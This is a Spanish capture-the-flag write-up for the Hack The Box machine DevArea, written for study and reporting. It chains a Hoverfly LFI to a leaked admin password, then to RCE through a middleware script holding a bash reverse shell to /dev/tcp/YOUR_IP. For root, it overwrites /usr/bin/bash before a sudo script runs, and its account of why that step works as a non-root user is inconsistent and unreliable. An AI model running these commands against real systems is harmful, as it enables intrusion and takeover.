---
title: "DevArea — LFI en Hoverfly a RCE por middleware y escalada por sustitución de binario"
date: 2026-07-31
box: DevArea
plataforma: Hack The Box
so: Linux
dificultad: Retirada
lead: "Un proxy de simulación de APIs (Hoverfly) filtra su contraseña de administración por una LFI, y esa misma consola permite definir un binario arbitrario como middleware: RCE. La escalada explota una race condition contra un script con sudo que confía en el intérprete del PATH."
stack: "Hoverfly · LFI · API abuse · Middleware RCE · sudo · TOCTOU"
description: "Writeup de la máquina DevArea de Hack The Box (Linux, retirada): LFI en Hoverfly, autenticación con la credencial filtrada, RCE vía middleware del proxy y escalada a root sustituyendo /usr/bin/bash antes de una ejecución con sudo."
---

DevArea es una máquina Linux (ya retirada) que gira en torno a **Hoverfly**, un
proxy/simulador de APIs. Una LFI me filtra la contraseña del panel de
administración, y desde ese panel puedo definir un binario arbitrario como
*middleware* del proxy: en cuanto pasa tráfico, se ejecuta, y eso es un RCE. Para
root, aprovecho una *race condition* de binario contra un script que se lanza con
`sudo` y confía en el `bash` del `PATH`. No incluyo flags: lo que me interesa es por
qué cada paso habilita al siguiente.

## Recon

### nmap

```
# nmap -sS -sCV -Pn -A -vvv -p- --open --min-rate 5000 10.129.13.205
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://devarea.htb/
8080/tcp open  http    Jetty 9.4.27.v20200227
8500/tcp open  http    Golang net/http server
|   This is a proxy server. Does not respond to non-proxy requests.
8888/tcp open  http    Golang net/http server
|_http-title: Hoverfly Dashboard
```

De todo lo que aparece, lo que me llama la atención es el par de puertos de Golang:
el `8500` se identifica como un **proxy** ("this is a proxy server") y el `8888` como
el **Hoverfly Dashboard**, la API de administración. El FTP anónimo del `21` lo
exploro, pero no es la vía de entrada. El `80` redirige a `devarea.htb`, así que lo
añado a hosts:

```bash
echo '10.129.13.205 devarea.htb' | sudo tee -a /etc/hosts
```

## Shell as user

### Hoverfly: de LFI a la contraseña del panel

[Hoverfly](https://github.com/SpectoLabs/hoverfly) es un proxy/simulador de APIs. La
versión expuesta es vulnerable a una fuga de información (LFI) por la importación de
esquemas XOP/MTOM, documentada en el advisory oficial
[GHSA-r4h8-hfp2-ggmf](https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf).
La uso para leer el fichero de servicio/configuración de Hoverfly, que me filtra la
contraseña del dashboard:

```
[+] Hoverfly password: O7IJ27MyyXiU
```

Con ella me autentico contra la API:

```bash
curl -s -X POST http://devarea.htb:8888/api/token-auth \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "O7IJ27MyyXiU"}'
```

### Middleware = RCE

Aquí está el fallo de diseño. Hoverfly permite configurar un binario "middleware"
que procesa cada request/response que pasa por el proxy. Si controlo el binario y su
script, controlo la ejecución en el servidor. Registro un middleware que abre una
reverse shell:

```bash
curl -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "binary": "/bin/bash",
    "script": "#!/bin/bash\nbash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
  }'
```

El middleware solo se ejecuta cuando el proxy procesa tráfico, así que lo disparo
mandando una petición *a través* del proxy (puerto `8500`):

```bash
curl -s --proxy http://admin:O7IJ27MyyXiU@devarea.htb:8500 http://devarea.htb/ &
```

Eso obliga a Hoverfly a ejecutar el script sobre el tráfico proxied y me devuelve la
shell. El punto clave no es el LFI en sí, sino que Hoverfly **confía en el operador
autenticado del dashboard para definir un binario arbitrario como middleware**:
cualquier API que permita configurar "qué binario/script se ejecuta sobre cada
request" es, de hecho, un RCE si te puedes autenticar contra ella. El LFI solo fue el
vector para conseguir esa autenticación.

## Shell as root

Con shell de usuario, la escalada explota una **race condition de binario** contra un
script con permiso `sudo` (`/opt/syswatch/syswatch.sh`). Este es el log de la cadena,
resumido:

```
[*] LFI via XOP/MTOM → leyendo el fichero de servicio de Hoverfly...
[+] Hoverfly password: O7IJ27MyyXiU
[*] Autenticando contra Hoverfly...
[+] Token JWT obtenido
[*] Reverse shell → 10.10.15.246:4444
[+] Shell de usuario recibida
[*] Escalada de privilegios:
[*]   > cp /bin/bash /tmp/bash.bak
[*]   > escribir /tmp/evil_bash (bash malicioso, en hex, sin tocar disco visible)
[*]   > chmod +x /tmp/evil_bash
[*]   > killall -9 bash; sleep 2; cp /tmp/evil_bash /usr/bin/bash; \
          sudo /opt/syswatch/syswatch.sh --version
[+] Shell de ROOT recibida
root@devarea:/opt/HoverFly# id
uid=0(root) gid=0(root) groups=0(root)
root@devarea:/opt/HoverFly# cat /root/root.txt
[flag redactada]
```

La idea, paso a paso:

1. Preparo un `bash` malicioso (`evil_bash`) que, al ejecutarse, abre una reverse
   shell a un segundo puerto —escrito como hex para no dejar visible el binario.
2. Mato el `bash` en uso (`killall -9 bash`) para poder reemplazarlo.
3. Copio el `bash` malicioso sobre `/usr/bin/bash` **justo antes** de lanzar `sudo
   /opt/syswatch/syswatch.sh --version`.
4. Si `syswatch.sh` tiene shebang `#!/bin/bash` (o invoca `bash` internamente) y se
   ejecuta con `sudo` sin fijar una ruta absoluta ni verificar el intérprete, el
   sistema acaba ejecutando el `bash` sustituido **como root**. De ahí la segunda
   shell, ya con `uid=0`.

La causa raíz, para el reporte, es una variante de **CWE-367 (TOCTOU)** unida al abuso
de un binario de confianza en un script con `sudo`. La remediación no es "quitarle el
sudo al script", sino que el script **no fija una ruta absoluta verificada del
intérprete** ni restringe el `PATH`.

## Mitigaciones

| Fallo | Corrección |
|---|---|
| LFI en Hoverfly (XOP/MTOM) | Actualizar Hoverfly a la versión que corrige GHSA-r4h8-hfp2-ggmf; no exponer el dashboard a la red. |
| Middleware arbitrario = RCE | Restringir quién puede configurar middleware; tratar la consola de administración como un límite de confianza real. |
| Escalada por sustitución de `bash` | `Defaults secure_path` en `sudoers`, o invocar el intérprete por ruta absoluta y con permisos que el usuario que ejecuta no pueda reemplazar. |
